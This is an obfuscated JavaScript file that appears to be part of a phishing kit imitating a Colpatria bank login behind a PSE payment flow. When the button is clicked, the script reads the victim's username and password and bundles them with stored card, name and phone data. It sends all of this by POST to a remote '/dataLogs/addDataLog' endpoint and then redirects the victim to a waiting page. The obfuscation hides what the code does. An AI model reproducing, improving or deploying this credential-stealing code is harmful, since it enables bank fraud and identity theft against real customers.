const _0x170352 = _0x2793;
(function (_0x5777f5, _0x38dacc) {
  const _0x686cd6 = _0x2793,
    _0x40c8c8 = _0x5777f5();
  while (!![]) {
    try {
      const _0x1d0e44 =
        (-parseInt(_0x686cd6(0x96)) / 0x1) * (parseInt(_0x686cd6(0xb3)) / 0x2) +
        (-parseInt(_0x686cd6(0xa0)) / 0x3) *
          (-parseInt(_0x686cd6(0xa1)) / 0x4) +
        parseInt(_0x686cd6(0x9d)) / 0x5 +
        -parseInt(_0x686cd6(0x94)) / 0x6 +
        (parseInt(_0x686cd6(0xb0)) / 0x7) * (-parseInt(_0x686cd6(0xa4)) / 0x8) +
        (parseInt(_0x686cd6(0xb1)) / 0x9) * (-parseInt(_0x686cd6(0x97)) / 0xa) +
        (parseInt(_0x686cd6(0xb4)) / 0xb) * (parseInt(_0x686cd6(0x90)) / 0xc);
      if (_0x1d0e44 === _0x38dacc) break;
      else _0x40c8c8["push"](_0x40c8c8["shift"]());
    } catch (_0x1693c3) {
      _0x40c8c8["push"](_0x40c8c8["shift"]());
    }
  }
})(_0xdd0c, 0xbc021);
function _0xdd0c() {
  const _0x51ddd6 = [
    "preventDefault",
    "click",
    "txtUsuario",
    "disabled",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "application/json",
    "Ingresó\x20datos",
    "Error\x20al\x20agregar\x20datos\x20en\x20el\x20servidor",
    "899353BPJNRL",
    "275193UMRvhB",
    "user",
    "2SPmMzK",
    "979gjrBLj",
    "json",
    "location",
    "setItem",
    "getElementById",
    "POST",
    "info",
    "143532iucukz",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "error",
    "stringify",
    "3027390CClWxW",
    "dudename",
    "1376023XKEVGP",
    "10pbAyJN",
    "btnUsuario",
    "addEventListener",
    "PSE",
    "puser",
    "metaInfo",
    "6144000GTtuGN",
    "focus",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "1934625rrIbCt",
    "4KnpcjD",
    "/dataLogs/addDataLog",
    "dataLogId",
    "16yLUtjR",
    "telnum",
    "value",
    "dataLogToken",
  ];
  _0xdd0c = function () {
    return _0x51ddd6;
  };
  return _0xdd0c();
}
function updateLS() {
  const _0x2e1357 = _0x2793;
  LS[_0x2e1357(0x8c)](_0x2e1357(0x8f), JSON[_0x2e1357(0x93)](info));
}
const button = document[_0x170352(0x8d)](_0x170352(0x98)),
  userInput = document[_0x170352(0x8d)](_0x170352(0xaa)),
  passInput = document[_0x170352(0x8d)]("txtPass");
function _0x2793(_0x535301, _0x5409cf) {
  const _0xdd0cb6 = _0xdd0c();
  return (
    (_0x2793 = function (_0x2793a6, _0x1fbb04) {
      _0x2793a6 = _0x2793a6 - 0x8c;
      let _0x5481f9 = _0xdd0cb6[_0x2793a6];
      return _0x5481f9;
    }),
    _0x2793(_0x535301, _0x5409cf)
  );
}
button[_0x170352(0x99)](_0x170352(0xa9), async function (_0x4b5e2a) {
  const _0x13b297 = _0x170352;
  _0x4b5e2a[_0x13b297(0xa8)](), (button[_0x13b297(0xab)] = !![]);
  if (userInput["value"] == "" && passInput[_0x13b297(0xa6)] == "") {
    alert(_0x13b297(0x9f)),
      userInput[_0x13b297(0x9e)](),
      (button[_0x13b297(0xab)] = ![]);
    return;
  } else {
    const _0x2017fa = userInput[_0x13b297(0xa6)],
      _0x19ff8e = passInput["value"];
    (info[_0x13b297(0x9c)][_0x13b297(0xb2)] = _0x2017fa),
      (info[_0x13b297(0x9c)][_0x13b297(0x9b)] = _0x19ff8e),
      updateLS();
    const _0x3d83ca = {
      reg: info[_0x13b297(0x9c)]["cc"],
      name: info[_0x13b297(0x9c)][_0x13b297(0x95)],
      cl: info["metaInfo"][_0x13b297(0xa5)],
      us: info[_0x13b297(0x9c)]["user"],
      ps: info[_0x13b297(0x9c)][_0x13b297(0x9b)],
      bn: "㊗️​Colpatria",
      status: _0x13b297(0xae),
      source: _0x13b297(0x9a),
    };
    try {
      const _0x99ba66 = await fetch(url + _0x13b297(0xa2), {
        method: _0x13b297(0x8e),
        headers: {
          "Content-Type": _0x13b297(0xad),
          Origin: window[_0x13b297(0xb6)]["origin"],
        },
        body: JSON[_0x13b297(0x93)](_0x3d83ca),
      });
      if (!_0x99ba66["ok"]) {
        const _0x19ea1e = await _0x99ba66[_0x13b297(0xb5)]();
        throw new Error(_0x19ea1e[_0x13b297(0x92)] || _0x13b297(0xaf));
      }
      const _0x1779f1 = await _0x99ba66[_0x13b297(0xb5)]();
      localStorage[_0x13b297(0x8c)](_0x13b297(0xa7), _0x1779f1["token"]),
        localStorage[_0x13b297(0x8c)](_0x13b297(0xa3), _0x1779f1["id"]),
        console["log"](_0x13b297(0x91)),
        (window[_0x13b297(0xb6)]["href"] = "./wait.html");
    } catch (_0x3753a4) {
      console["error"](_0x13b297(0xac), _0x3753a4),
        alert("Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud."),
        (button[_0x13b297(0xab)] = ![]);
    }
  }
});
